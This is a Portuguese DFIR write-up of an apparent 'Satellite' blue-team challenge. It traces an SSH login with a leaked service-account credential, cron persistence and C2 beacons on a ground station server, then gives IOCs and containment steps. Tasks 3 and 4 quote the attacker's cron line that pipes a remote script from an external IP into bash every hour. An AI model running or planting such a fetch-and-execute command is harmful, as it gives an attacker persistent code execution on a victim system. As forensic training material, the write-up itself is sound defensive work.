---
title: "Satellite"
date: 2024-09-20
type: "sherlocks"
difficulty: "Medium"
pwned: true
tags: ["dfir", "satellite", "linux", "logs", "persistence", "cron"]
summary: "Uma estação terrestre de comunicação por satélite foi comprometida. Análise de logs Linux revela persistência via cron job malicioso instalado após acesso inicial por credencial vazada."
machine_info:
  Tipo: "Blue Team / DFIR"
  Cenário: "Ground station comprometida"
  Arquivos: "auth.log, syslog, cron.log"
  Ferramentas: "grep, awk, crontab, journalctl"
---

## Contexto

A equipe de operações de uma estação terrestre de comunicação por satélite reportou
comandos de telemetria inesperados sendo enfileirados fora da janela de operação.
Recebemos os logs do servidor de controle (`auth.log`, `syslog`, `cron.log`) para
investigar.

## Task 1 — Acesso inicial

```bash
$ grep "Accepted password" auth.log
Sep 18 02:14:07 groundctl-01 sshd[8841]: Accepted password for ops
    from 185.220.101.47 port 51234 ssh2
```

Login às **02:14:07 UTC**, horário fora do expediente da equipe, vindo de um IP
externo não catalogado na allowlist de VPN.

## Task 2 — Usuário comprometido

```bash
$ grep "Accepted password" auth.log | awk '{print $9}'
ops
```

A conta de serviço **`ops`**, usada por scripts de automação, foi comprometida —
provavelmente por credencial reaproveitada de outro vazamento (a conta não tinha
MFA habilitado).

## Task 3 — Persistência instalada

```bash
$ grep "CMD" cron.log | grep ops
Sep 18 02:16:41 groundctl-01 CROND[9012]: (ops) CMD
    (curl -s http://45.155.205.12/update.sh | bash)
```

Um cron job foi adicionado à crontab do usuário `ops` dois minutos após o login,
baixando e executando um script remoto a cada hora.

## Task 4 — Verificando a crontab

```bash
$ crontab -u ops -l
0 * * * * curl -s http://45.155.205.12/update.sh | bash
```

Persistência **horária** — o atacante garantiu reexecução mesmo se o processo
inicial fosse encerrado.

## Task 5 — O que o script fazia

Reconstituindo a partir dos logs de syslog (outbound connections):

```bash
$ grep "45.155.205.12" syslog
Sep 18 03:00:03 groundctl-01 kernel: [UFW] OUT
    SRC=10.20.4.12 DST=45.155.205.12 DPT=443
```

O script fazia beacon de C2 a cada hora e, segundo os comandos de telemetria
enfileirados fora de janela, tentava manipular a fila de comandos de uplink —
consistente com uma tentativa de sequestrar comandos enviados ao satélite.

## Task 6 — Contenção

```bash
# Remoção da persistência
$ crontab -u ops -r

# Bloqueio do IP de C2 no firewall perimetral
$ ufw deny out to 45.155.205.12

# Rotação de credenciais da conta de serviço
$ passwd ops && ssh-keygen -R groundctl-01
```

## Timeline

| Horário (UTC) | Evento |
|---------------|--------|
| 02:14:07 | Login SSH bem-sucedido com credencial da conta `ops` |
| 02:16:41 | Instalação do cron job de persistência |
| 03:00:03 | Primeiro beacon de C2 registrado |
| 04:00:02 – 09:00:04 | Beacons horários subsequentes (6 no total) |
| 09:42:00 | Detecção pela equipe de operações — comandos fora de janela |

## IOCs

- **IP de login inicial:** 185.220.101.47
- **IP de C2:** 45.155.205.12
- **Conta comprometida:** `ops` (conta de serviço, sem MFA)
- **Persistência:** cron job horário (`curl | bash`)
- **Payload:** `update.sh`

## Lições

- Contas de serviço usadas por automação precisam de MFA ou, no mínimo,
  chaves SSH com restrição de IP de origem.
- Monitorar alterações em crontabs de contas privilegiadas em tempo real.
- Qualquer comando de telemetria fora da janela operacional deveria disparar
  alerta automático, não depender de detecção manual.
